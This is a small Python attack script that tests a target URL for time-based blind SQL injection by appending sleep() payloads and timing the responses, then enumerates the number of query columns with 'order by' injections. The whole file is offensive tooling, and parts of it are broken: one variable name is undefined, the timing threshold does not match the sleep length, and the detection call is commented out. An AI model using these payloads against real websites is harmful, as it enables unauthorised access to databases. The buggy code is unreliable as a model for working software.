#!/usr/bin/python3

import sys,requests
import time



def help_menu():
    print("-u,--url  Url")
    print("-t,--type It shows which type of sqli the vulnerability is based, one of type Error based or of type Blind")

def find_sqli_blind(url,s):
    payload=""
    payload+=url
    payload+="' or sleep(2)--+"
    print(payload)
    start_time = time.time()
    r=s.get(payload)
    tiempo=round(time.time() - start_time,2)
    return True if(tiempo > 5 and int(r.status_code)==200) else False

def enum_columns(url,s):
    columna_max=0
    for i in range(2,10):
        sql_payload="1' and sleep(2) order by %s --+"%i
        payloadf=url+sql_payload
        start_time = time.time()        
        r=s.get(payloadf)
        tiempo=round(time.time() - start_time,2)
        if(tiempo < 2):
            break
        else:
            columna_max=i
    return columna_max

url=""
opcion1=""
try:
    opcion1=str(sys.argv[1])
    if(opcion1=="-u" or opcion=="--url"):
        url=str(sys.argv[2])
except:
    help_menu()


s=requests.session()
s.get(url)
r=s.get(url)

final_column=enum_columns(url,s)
print(final_column)

"""
if(find_sqli_blind(url,s)):
    print("Exist SQLi in the target ")
"""

